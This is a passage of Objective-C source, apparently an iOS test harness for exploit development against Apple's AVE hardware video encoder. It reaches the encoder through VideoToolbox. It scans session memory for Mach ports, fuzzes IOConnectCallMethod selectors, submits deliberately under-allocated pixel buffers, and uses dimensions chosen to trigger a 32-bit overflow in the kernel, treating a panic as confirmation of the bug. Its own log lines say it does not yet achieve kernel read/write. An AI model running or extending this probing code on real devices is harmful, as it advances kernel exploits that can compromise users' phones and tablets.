    [self runProcessCase:out label:@"C- under 65519x8192" width:65519 height:8192 bufferMode:@"underalloc"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"C0 at-cap 65520x8192" width:65520 height:8192 bufferMode:@"underalloc"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"C+ over 65521x8192" width:65521 height:8192 bufferMode:@"underalloc"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"Cswap 8192x65520" width:8192 height:65520 bufferMode:@"underalloc"];
    fcntl(fd, F_FULLFSYNC);
    [self runProcessCase:out label:@"Csq 23170x23170" width:23170 height:23170 bufferMode:@"underalloc"];
    fcntl(fd, F_FULLFSYNC);

    vt647Log(fd, out, @"\nDONE — paste this text back");
    vt647Log(fd, out, @"S1/S2 OK S3 -19354 = same as iPad (VT level, not CheckInfo)");
    vt647Log(fd, out, @"C0 vs C+ split on -19354 = product-cap visible through VT");
    vt647Log(fd, out, @"Panic = unexpected; stop. Not KRW.");
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return out;
}

+ (NSString *)performP001FullLadderProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P001 full-NV12 size ladder — find AVE Process ceiling\n"];
    [out appendString:@"Honest full alloc (no under-stride). Not KRW.\n"];
    [out appendString:@"Ghidra: Start->Verify bakes dims; Process(state==2) creates surfaces.\n"];

    [self runProcessCase:out label:@"S0 1920x1080" width:1920 height:1080 bufferMode:@"full"];
    [self runProcessCase:out label:@"S1 3840x2160" width:3840 height:2160 bufferMode:@"full"];
    [self runProcessCase:out label:@"S2 4096x4096" width:4096 height:4096 bufferMode:@"full"];
    [self runProcessCase:out label:@"S3 8192x8192" width:8192 height:8192 bufferMode:@"full"];

    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"Read:\n"];
    [out appendString:@"  All OK -> AVE Process reachable at large dims; barrier=805MB over-cap frame\n"];
    [out appendString:@"  S3 FAIL -> VT/AVE cap below 8192; P001-via-VT likely dead -> P008/method-table\n"];
    return out;
}

+ (NSString *)performP001VTConnHunt {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P001 VT conn hunt — scan session object for io_connect_t\n"];
    [out appendString:@"Ladder: Process OK through 4096; 8192 encode -12902. VT clamps.\n"];
    [out appendString:@"No port scan, no pointer chase. Not KRW.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    typedef kern_return_t (*Call_t)(mach_port_t, uint32_t, const uint64_t *, uint32_t,
                                    const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
    Call_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!pCall) { [out appendString:@"STOP dlsym\n"]; return out; }

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
        NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
    if (st != noErr || !session) {
        [out appendFormat:@"Create FAIL %d\n", (int)st];
        return out;
    }
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    [out appendFormat:@"session=%p Prepare=%d\n", session, (int)st];

    mach_port_t conns[16];
    int nConns = 0;
    uintptr_t base = (uintptr_t)session;
    for (ptrdiff_t off = 0; off < 4096 && nConns < 16; off += 8) {
        uintptr_t val = *(uintptr_t *)(base + off);
        if (val == 0 || val >= 0x10000) continue;
        int dup = 0;
        for (int k = 0; k < nConns; k++) if (conns[k] == (mach_port_t)val) { dup = 1; break; }
        if (dup) continue;
        kern_return_t r = pCall((mach_port_t)val, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur == 0x10000003) continue;
        conns[nConns++] = (mach_port_t)val;
        [out appendFormat:@"conn[%d]=%u off=0x%tx rc=0x%08x\n", nConns-1, (unsigned)val, off, ur];
    }
    [out appendFormat:@"valid conns in session: %d\n", nConns];

    uint8_t inS[0x1000];
    memset(inS, 0, sizeof(inS));
    *(uint32_t *)(inS + 0xa70) = 1280;
    *(uint32_t *)(inS + 0xa74) = 720;
    uint8_t outS[0x1000];
    for (int ci = 0; ci < nConns; ci++) {
        int nb = 0;
        for (uint32_t sel = 0; sel < 56; sel++) {
            size_t oc = sizeof(outS);
            kern_return_t r = pCall(conns[ci], sel, NULL, 0, inS, sizeof(inS), NULL, NULL, outS, &oc);
            if ((unsigned)r != 0xe00002c2) {
                nb++;
                [out appendFormat:@"conn[%d] sel=%u -> 0x%08x\n", ci, sel, (unsigned)r];
            }
        }
        [out appendFormat:@"conn[%d] non-Bad sels: %d\n", ci, nb];
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"0 conns = AVE UC not in session object (same as Metal/AGX split).\n"];
    [out appendString:@"non-Bad sel = possible AVE method; still not KRW.\n"];
    return out;
}

static void p001SnapSendPorts(mach_port_name_t *names, int *n, int cap) {
    *n = 0;
    for (mach_port_name_t pn = 0x100; pn < 0x10000 && *n < cap; pn++) {
        mach_port_type_t pt = 0;
        if (mach_port_type(mach_task_self(), pn, &pt) != KERN_SUCCESS) continue;
        if (((pt >> 16) & 0x1) == 0) continue; // SEND
        if ((pt >> 16) & 0x8) continue;        // DEAD
        names[(*n)++] = pn;
    }
}

static void p001DiffPorts(NSMutableString *out, const char *label,
                          mach_port_name_t *before, int nBefore,
                          mach_port_name_t *after, int nAfter) {
    int added = 0, gone = 0;
    for (int i = 0; i < nAfter; i++) {
        int found = 0;
        for (int j = 0; j < nBefore; j++) if (before[j] == after[i]) { found = 1; break; }
        if (!found) {
            mach_port_type_t pt = 0;
            mach_port_type(mach_task_self(), after[i], &pt);
            [out appendFormat:@"  +port %u pt=0x%x\n", after[i], pt];
            added++;
        }
    }
    for (int i = 0; i < nBefore; i++) {
        int found = 0;
        for (int j = 0; j < nAfter; j++) if (after[j] == before[i]) { found = 1; break; }
        if (!found) {
            [out appendFormat:@"  -port %u\n", before[i]];
            gone++;
        }
    }
    [out appendFormat:@"%@: send-ports %d -> %d  added=%d gone=%d\n",
     [NSString stringWithUTF8String:label], nBefore, nAfter, added, gone];
}

+ (NSString *)performP001CrossRefProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"Cross-ref: port-diff Metal/VT (SAFE) + 4096 under-alloc encode\n"];
    [out appendString:@"T4: if VT/Metal open AVE/IOGPU in-process, new SEND right appears.\n"];
    [out appendString:@"T2: C1 under-alloc encoded at 720p; S2 full encoded at 4096.\n"];
    [out appendString:@"    Under-alloc at 4096 = claimed dims vs small backing at last Process size.\n"];
    [out appendString:@"No IOConnectCallMethod on new ports (XPC crash). Not KRW.\n"];

    enum { kCap = 256 };
    mach_port_name_t a[kCap], b[kCap], c[kCap];
    int na = 0, nb = 0, nc = 0;
    p001SnapSendPorts(a, &na, kCap);
    [out appendFormat:@"baseline SEND ports: %d\n", na];

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    [out appendFormat:@"Metal: %@\n", mtl ? [mtl name] : @"(nil)"];
    if (mtl) {
        id<MTLCommandQueue> q = [mtl newCommandQueue];
        (void)[mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
        @autoreleasepool {
            id<MTLCommandBuffer> cmd = [q commandBuffer];
            [cmd commit];
            [cmd waitUntilCompleted];
        }
    }
    p001SnapSendPorts(b, &nb, kCap);
    p001DiffPorts(out, "after Metal", a, na, b, nb);

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
        NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
    [out appendFormat:@"VT Create: %d session=%p\n", (int)st, session];
    if (session) {
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTCompressionSessionPrepareToEncodeFrames(session);
    }
    p001SnapSendPorts(c, &nc, kCap);
    p001DiffPorts(out, "after VT Prepare", b, nb, c, nc);
    if (session) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }

    [out appendString:@"\n--- T2 under-alloc 4096x4096 (last working Process) ---\n"];
    [self runProcessCase:out
                   label:@"T2 under-alloc 4096x4096"
                   width:4096
                  height:4096
              bufferMode:@"underalloc"];

    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"Read: 0 added ports = UC not in our task (XPC/daemon).\n"];
    [out appendString:@"T2 encode OK = AVE accepted lying backing at 4096 (size mismatch still soft).\n"];
    [out appendString:@"T2 panic / NEW status = Process OOB at reachable dim.\n"];
    return out;
}

+ (NSString *)performP001NewPortSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"New-port sweep — SEND-only (0x10000) added by Metal then VT\n"];
    [out appendString:@"Skip 0x30000 local pairs. Cross-ref: Metal +13, VT +4, T2 4096 under-alloc encoded.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    typedef kern_return_t (*Call_t)(mach_port_t, uint32_t, const uint64_t *, uint32_t,
                                    const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
    Call_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!pCall) { [out appendString:@"STOP dlsym\n"]; return out; }

    enum { kCap = 256 };
    mach_port_name_t a[kCap], b[kCap], c[kCap];
    int na = 0, nb = 0, nc = 0;
    p001SnapSendPorts(a, &na, kCap);

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (mtl) {
        id<MTLCommandQueue> q = [mtl newCommandQueue];
        (void)[mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
        @autoreleasepool {
            id<MTLCommandBuffer> cmd = [q commandBuffer];
            [cmd commit];
            [cmd waitUntilCompleted];
        }
    }
    p001SnapSendPorts(b, &nb, kCap);

    VTCompressionSessionRef session = NULL;
    VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
                               NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
    if (session) {
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTCompressionSessionPrepareToEncodeFrames(session);
    }
    p001SnapSendPorts(c, &nc, kCap);

    uint8_t *inS = calloc(1, 0x1000);
    uint8_t *outS = calloc(1, 0x1000);
    if (!inS || !outS) { [out appendString:@"STOP calloc\n"]; return out; }
    *(uint32_t *)(inS + 0xa70) = 1280;
    *(uint32_t *)(inS + 0xa74) = 720;

    void (^probeList)(mach_port_name_t *, int, mach_port_name_t *, int, const char *) =
    ^(mach_port_name_t *after, int nAfter, mach_port_name_t *before, int nBefore, const char *tag) {
        [out appendFormat:@"\n--- %@ new SEND-only ---\n", [NSString stringWithUTF8String:tag]];
        int nTest = 0;
        for (int i = 0; i < nAfter; i++) {
            int old = 0;
            for (int j = 0; j < nBefore; j++) if (before[j] == after[i]) { old = 1; break; }
            if (old) continue;
            mach_port_type_t pt = 0;
            mach_port_type(mach_task_self(), after[i], &pt);
            if (pt != 0x10000) {
                [out appendFormat:@"skip %u pt=0x%x\n", after[i], pt];
                continue;
            }
            // SAFE: only MIG-probe if this port number appears in Metal/VT object memory
            // Cross-ref against device/queue/buf/session raw memory
            int found = 0;
            uintptr_t objs[] = {
                mtl ? (uintptr_t)(__bridge void *)mtl : 0,
                (mtl && [mtl newCommandQueue]) ? (uintptr_t)(__bridge void *)[mtl newCommandQueue] : 0,
                (mtl && [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared]) ? (uintptr_t)(__bridge void *)[mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared] : 0,
                session ? (uintptr_t)session : 0,
            };
            for (int oi = 0; oi < 4 && !found; oi++) {
                if (!objs[oi]) continue;
                for (ptrdiff_t off = 0; off < 4096 && !found; off += 8) {
                    uintptr_t val = *(uintptr_t *)(objs[oi] + off);
                    if (val == after[i]) { found = 1; [out appendFormat:@"port %u in obj[%d]+0x%tz\n", after[i], oi, off]; }
                }
            }
            if (!found) {
                [out appendFormat:@"port %u NOT in obj mem (skip — XPC risk)\n", after[i]];
                continue;
            }
            nTest++;
            kern_return_t r0 = pCall(after[i], 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
            unsigned u0 = (unsigned)r0;
            [out appendFormat:@"port %u sel0 -> 0x%08x", after[i], u0];
            if (u0 == 0x10000003) { [out appendString:@" MIG\n"]; continue; }
            if (u0 == 0xe00002c2) [out appendString:@" BadArg"];
            else if (u0 == 0) [out appendString:@" OK"];
            else [out appendString:@" NEW"];
            [out appendString:@"\n"];
            int nbSel = 0;
            for (uint32_t sel = 0; sel < 56; sel++) {
                size_t oc = 0x1000;
                kern_return_t r = pCall(after[i], sel, NULL, 0, inS, 0x1000, NULL, NULL, outS, &oc);
                if ((unsigned)r != 0xe00002c2 && (unsigned)r != 0x10000003) {
                    nbSel++;
                    [out appendFormat:@"  sel=%u -> 0x%08x\n", sel, (unsigned)r];
                }
            }
            [out appendFormat:@"  non-Bad/non-MIG sels: %d\n", nbSel];
        }
        [out appendFormat:@"tested %d SEND-only new ports (in obj mem)\n", nTest];
    };

    probeList(b, nb, a, na, "Metal");
    probeList(c, nc, b, nb, "VT");

    free(inS);
    free(outS);

    if (session) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
    [out appendString:@"\nDONE — paste this text back\n"];
    [out appendString:@"AGX-like: all BadArg. AVE/IOGPU: any non-Bad sel. Crash=that port was XPC.\n"];
    return out;
}

#pragma mark - 64747 via VideoToolbox (sandbox-legal path)

+ (NSString *)perform64747VTWrap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"ave64747_vt.txt"];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    vt647Log(fd, out, @"logfile: %@", lp);
    vt647Log(fd, out, @"=== 64747 via VideoToolbox (sandbox-legal path) ===");
    vt647Log(fd, out, @"time %@", [NSDate date]);
    vt647Log(fd, out, @"Direct IOServiceOpen(AppleAVE2*) = 0xe00002e2. VT is the remaining app path.");
    vt647Log(fd, out, @"If device panics: DO NOT re-tap. This file + panic log = confirmation.");

    // Case 0: control — prove VT actually reaches the encoder on this device.
    {
        vt647Log(fd, out, @"CHK control 1280x720 Create+Prepare+Encode");
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
            NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
        vt647Log(fd, out, @"  Create: %d (0x%x)%@", (int)st, (unsigned)st,
                 (st == noErr && session) ? @" OK" : @" FAIL");
        if (st == noErr && session) {
            VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            st = VTCompressionSessionPrepareToEncodeFrames(session);
            vt647Log(fd, out, @"  Prepare: %d (0x%x)", (int)st, (unsigned)st);
            CVPixelBufferRef pb = NULL;
            st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                     kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
            vt647Log(fd, out, @"  PixelBuffer: %d pb=%p", (int)st, pb);
            if (pb) {
                st = VTCompressionSessionEncodeFrame(
                    session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
                vt647Log(fd, out, @"  EncodeFrame: %d (0x%x)", (int)st, (unsigned)st);
                st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                vt647Log(fd, out, @"  Complete: %d (0x%x)", (int)st, (unsigned)st);
                CVPixelBufferRelease(pb);
            }
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    }

    // Wrap / oversize Create+Prepare. Tiny 64x64 EncodeFrame so we don't OOM.
    // w/h chosen against the 22H311 unguarded 32-bit calc family.
    struct { const char *label; int32_t w, h; BOOL encodeTiny; } cases[] = {
        { "at-cap-ish 8192x8192",          8192,    8192,    NO  },
        { "CheckInfo-over 65521x8192",     65521,   8192,    NO  },
        { "wrap 65536x65536",              65536,   65536,   NO  },
        { "wrap 16384x16384 + tiny enc",   16384,   16384,   YES },
        { "wrap 0x4000 x 0x4000",          0x4000,  0x4000,  YES },
        { "signed-max 0x7fff x 0x7fff",    0x7fff,  0x7fff,  YES },
    };
    int n = (int)(sizeof(cases) / sizeof(cases[0]));
    for (int i = 0; i < n; i++) {
        vt647Log(fd, out, @"CHK %@ %dx%d",
                 [NSString stringWithUTF8String:cases[i].label], cases[i].w, cases[i].h);
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, cases[i].w, cases[i].h, kCMVideoCodecType_H264,
            NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
        vt647Log(fd, out, @"  Create: %d (0x%x)%@", (int)st, (unsigned)st,
                 (st == noErr && session) ? @" OK — dims reached VT/AVE" : @" FAIL — VT clamped");
        if (st != noErr || !session) continue;
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        st = VTCompressionSessionPrepareToEncodeFrames(session);
        vt647Log(fd, out, @"  Prepare: %d (0x%x)", (int)st, (unsigned)st);
        if (cases[i].encodeTiny) {
            CVPixelBufferRef pb = NULL;
            st = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                     kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
            if (pb) {
                st = VTCompressionSessionEncodeFrame(
                    session, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
                vt647Log(fd, out, @"  EncodeFrame(tiny 64x64): %d (0x%x)", (int)st, (unsigned)st);
                st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                vt647Log(fd, out, @"  Complete: %d (0x%x)", (int)st, (unsigned)st);
                CVPixelBufferRelease(pb);
            } else {
                vt647Log(fd, out, @"  tiny PixelBuffer FAIL %d — skip encode", (int)st);
            }
        } else {
            vt647Log(fd, out, @"  encode: skipped (create/prepare only)");
        }
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }

    vt647Log(fd, out, @"DONE — paste back.");
    vt647Log(fd, out, @"Read: control Encode OK = AVE reached via VT.");
    vt647Log(fd, out, @"Create OK on wrap = dims passed userspace; Prepare/Encode panic = 64747.");
    vt647Log(fd, out, @"Create FAIL on wrap = VT clamped; kernel overflow not reachable from app via VT.");
    if (fd >= 0) close(fd);
    return out;
}

+ (NSString *)perform64747VTTrueWrap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"ave64747_truewrap.txt"];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    vt647Log(fd, out, @"logfile: %@", lp);
    vt647Log(fd, out, @"=== 64747 TRUE 32-bit wrap Create+Prepare (no encode) ===");
    vt647Log(fd, out, @"time %@", [NSDate date]);
    vt647Log(fd, out, @"MBInputCtrl wrap: align32(w)*(h>>5) >= 2^32. 65536x65536 does NOT wrap.");
    vt647Log(fd, out, @"If panics: DO NOT re-tap. CHK line names the dims.");

    struct { const char *label; int32_t w, h; CMVideoCodecType codec; } cases[] = {
        { "H264 65536x2097152 (wraps w*(h>>5)=2^32)", 65536, 2097152, kCMVideoCodecType_H264 },
        { "H264 2097152x65536",                        2097152, 65536, kCMVideoCodecType_H264 },
        { "H264 0x7fff0000 x 64",                      0x7fff0000, 64, kCMVideoCodecType_H264 },
        { "H264 0x40000000 x 32",                      0x40000000, 32, kCMVideoCodecType_H264 },
        { "HEVC 65536x2097152",                        65536, 2097152, kCMVideoCodecType_HEVC },
        { "HEVC 0x7fff0000 x 64",                      0x7fff0000, 64, kCMVideoCodecType_HEVC },
    };
    int n = (int)(sizeof(cases) / sizeof(cases[0]));
    for (int i = 0; i < n; i++) {
        vt647Log(fd, out, @"CHK %@ %dx%d codec=0x%x",
                 [NSString stringWithUTF8String:cases[i].label],
                 cases[i].w, cases[i].h, (unsigned)cases[i].codec);
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, cases[i].w, cases[i].h, cases[i].codec,
            NULL, NULL, NULL, flushCB, (__bridge void *)out, &session);
        vt647Log(fd, out, @"  Create: %d (0x%x)%@", (int)st, (unsigned)st,
                 (st == noErr && session) ? @" OK" : @" FAIL");
        if (st != noErr || !session) continue;
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        st = VTCompressionSessionPrepareToEncodeFrames(session);
        vt647Log(fd, out, @"  Prepare: %d (0x%x)", (int)st, (unsigned)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }

    vt647Log(fd, out, @"DONE — paste back.");
    vt647Log(fd, out, @"Create FAIL = VT refused wrap dims. Prepare panic = 64747 at session setup.");
    vt647Log(fd, out, @"Prepare 0 + survive = calc not called with those dims, or wrap size still allocated.");
    if (fd >= 0) close(fd);
    return out;
}

@end
